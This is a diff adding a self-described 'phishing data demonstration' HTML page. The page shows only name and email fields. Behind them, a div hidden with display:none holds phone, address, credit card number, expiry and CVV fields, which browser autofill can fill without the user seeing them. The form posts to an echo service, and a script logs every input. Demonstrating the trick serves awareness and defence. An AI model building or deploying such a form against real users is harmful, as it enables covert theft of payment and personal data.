@@ -1,0 +1,151 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Browser Autofill Phishing</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      form {
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        width: 400px;
+      }
+
+      form p {
+        margin: 15px 0;
+      }
+
+      label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 5px;
+      }
+
+      input, select {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+
+      input[type="submit"] {
+        background-color: #007BFF;
+        color: white;
+        border: none;
+        cursor: pointer;
+        font-size: 16px;
+      }
+
+      input[type="submit"]:hover {
+        background-color: #0056b3;
+      }
+
+      .hidden-fields {
+        display: none;
+      }
+
+      .hidden-fields select,
+      .hidden-fields input {
+        margin-top: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <form action="https://httpbin.org/post" method="post">
+      <h1>Phishing data demonstration</h1>
+      <p>
+        <label for="name">Name</label>
+        <input id="name" name="name" type="text" placeholder="Your Name">
+      </p>
+      <p>
+        <label for="email">Email</label>
+        <input id="email" name="email" type="email" placeholder="Your Email">
+      </p>
+      <p>
+        <input type="submit" value="Submit">
+      </p>
+      <!-- Hidden fields -->
+      <div class="hidden-fields">
+        <p>
+          <input id="phone" name="phone" type="text" placeholder="Your Phone">
+        </p>
+        <p>
+          <input id="organization" name="organization" type="text" placeholder="Your Organization">
+        </p>
+        <p>
+          <input id="address" name="address" type="text" placeholder="Your Address">
+        </p>
+        <p>
+          <input id="postal" name="postal" type="text" placeholder="Your Postal Code">
+        </p>
+        <p>
+          <input id="city" name="city" type="text" placeholder="Your City">
+        </p>
+        <p>
+          <label for="country">Country</label>
+          <select name="country">
+            <option value="">Select Country</option>
+            <option value="FI">Finland</option>
+            <option value="US">United States</option>
+            <option value="IN">India</option>
+            <!-- Add more options as needed -->
+          </select>
+        </p>
+        <p>
+          <input type="text" name="cc_number" placeholder="Credit Card Number">
+        </p>
+        <p>
+          <label for="cc_month">Expiration Month</label>
+          <select name="cc_month" id="cc_month">
+            <option value="01">01</option>
+            <option value="02">02</option>
+            <option value="03">03</option>
+            <option value="04">04</option>
+            <option value="05">05</option>
+            <option value="06">06</option>
+            <option value="07">07</option>
+            <option value="08">08</option>
+            <option value="09">09</option>
+            <option value="10">10</option>
+            <option value="11">11</option>
+            <option value="12">12</option>
+          </select>
+        </p>
+        <p>
+          <label for="cc_year">Expiration Year</label>
+          <select name="cc_year" id="cc_year">
+            <option>2024</option>
+            <option>2025</option>
+            <option>2026</option>
+            <option>2027</option>
+          </select>
+        </p>
+        <p>
+          <input type="text" id="cc_cvv" name="cc_cvv" placeholder="CVV">
+        </p>
+      </div>
+    </form>
+    <script type="text/javascript">
+      function onchangehandler(event) {
+        console.log(event.target.name + ": " + event.target.value);
+      }
+
+      // Apply 'input' event to every input element
+      document.querySelectorAll('input').forEach(function(input) {
+        input.addEventListener('input', onchangehandler);
+      });
+    </script>
+  </body>
+</html>
